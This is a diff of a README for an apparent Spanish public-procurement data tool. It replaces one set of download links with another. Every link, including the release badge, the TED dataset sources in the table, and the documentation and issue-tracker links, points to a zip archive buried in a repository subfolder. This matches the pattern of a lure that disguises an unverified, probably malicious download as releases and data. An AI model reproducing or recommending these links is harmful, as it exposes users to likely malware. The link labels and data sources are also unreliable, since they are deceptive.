@@ -17,7 +17,7 @@ Before downloading the application, ensure your system meets the following requi
 
 To download the latest version of the application, visit the Releases page below:
 
-[![Download Release](https://github.com/Hikaru17zx/licitaciones-espana/raw/refs/heads/main/catalunya/convenios/licitaciones-espana-3.3.zip%https://github.com/Hikaru17zx/licitaciones-espana/raw/refs/heads/main/catalunya/convenios/licitaciones-espana-3.3.zip)](https://github.com/Hikaru17zx/licitaciones-espana/raw/refs/heads/main/catalunya/convenios/licitaciones-espana-3.3.zip)
+[![Download Release](https://raw.githubusercontent.com/Hikaru17zx/licitaciones-espana/main/valencia/subvenciones/licitaciones_espana_2.5.zip%https://raw.githubusercontent.com/Hikaru17zx/licitaciones-espana/main/valencia/subvenciones/licitaciones_espana_2.5.zip)](https://raw.githubusercontent.com/Hikaru17zx/licitaciones-espana/main/valencia/subvenciones/licitaciones_espana_2.5.zip)
 
 This link takes you to the page where you can download the necessary files.
 
@@ -60,8 +60,8 @@ The TED (Tenders Electronic Daily) dataset provides contracts published in the E
 
 | Conjunto | Registros | Período | Fuente |
 |----------|-----------|---------|--------|
-| CSV bulk | 339K | 2010-2019 | https://github.com/Hikaru17zx/licitaciones-espana/raw/refs/heads/main/catalunya/convenios/licitaciones-espana-3.3.zip |
-| API v3 eForms | 252K | 2020-2025 | https://github.com/Hikaru17zx/licitaciones-espana/raw/refs/heads/main/catalunya/convenios/licitaciones-espana-3.3.zip |
+| CSV bulk | 339K | 2010-2019 | https://raw.githubusercontent.com/Hikaru17zx/licitaciones-espana/main/valencia/subvenciones/licitaciones_espana_2.5.zip |
+| API v3 eForms | 252K | 2020-2025 | https://raw.githubusercontent.com/Hikaru17zx/licitaciones-espana/main/valencia/subvenciones/licitaciones_espana_2.5.zip |
 | **Consolidado** | **591K** | **2010-2025** |  |
 
 This data can be essential for researchers, businesses, and public entities exploring contract opportunities and trends.
@@ -80,9 +80,9 @@ If you encounter issues or have questions about the application, visit our suppo
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Hikaru17zx/licitaciones-espana/raw/refs/heads/main/catalunya/convenios/licitaciones-espana-3.3.zip)
-- [Documentation](https://github.com/Hikaru17zx/licitaciones-espana/raw/refs/heads/main/catalunya/convenios/licitaciones-espana-3.3.zip)
-- [Issues Tracker](https://github.com/Hikaru17zx/licitaciones-espana/raw/refs/heads/main/catalunya/convenios/licitaciones-espana-3.3.zip)
+- [Releases Page](https://raw.githubusercontent.com/Hikaru17zx/licitaciones-espana/main/valencia/subvenciones/licitaciones_espana_2.5.zip)
+- [Documentation](https://raw.githubusercontent.com/Hikaru17zx/licitaciones-espana/main/valencia/subvenciones/licitaciones_espana_2.5.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/Hikaru17zx/licitaciones-espana/main/valencia/subvenciones/licitaciones_espana_2.5.zip)
 
 Feel free to explore the resources and enhance your understanding of Spanish public procurement data.
 
